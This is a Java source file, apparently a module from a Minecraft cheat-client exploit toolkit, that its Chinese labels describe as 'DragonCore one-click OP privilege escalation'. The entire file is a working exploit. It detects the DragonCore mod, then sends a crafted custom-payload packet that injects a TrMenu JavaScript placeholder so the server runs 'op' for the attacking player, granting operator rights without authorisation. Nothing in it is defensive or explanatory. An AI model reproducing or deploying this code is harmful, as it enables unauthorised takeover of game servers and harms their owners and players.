package moe.badcat.module.modules;

import moe.badcat.module.BaseModule;
import io.netty.buffer.Unpooled;
import java.util.UUID;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;

public class ModuleDragonCore extends BaseModule {
    public ModuleDragonCore() {
        super("漏洞类", "龙核一键OP提权");
    }

    @Override
    public boolean initModule() {
        try {
            try {
                Class.forName("eos.moe.dragoncore.tweaker.ForgePlugin");
            } catch (Exception e) {
                Class.forName("eos.moe.dragoncore.api.CoreAPI");
            }
            return true;
        } catch (Exception ignored) {}
        return false;
    }

    @Override
    public void onUse() {
        try {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeByte(64); // Forge Packet ID
            buffer.writeInt(3); // MessagePlaceholder ID
            buffer.writeInt(1); // Size
            buffer.writeString(" %trmenu_js_utils.runAction(player,\"op: op " + Minecraft.getMinecraft().player.getName() + "\")% ");
            buffer.writeString(UUID.randomUUID().toString());
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload("dragoncore:main", buffer));
        } catch (Exception e) {
            if (ModuleDebug.enable) e.printStackTrace();
        }
    }
}
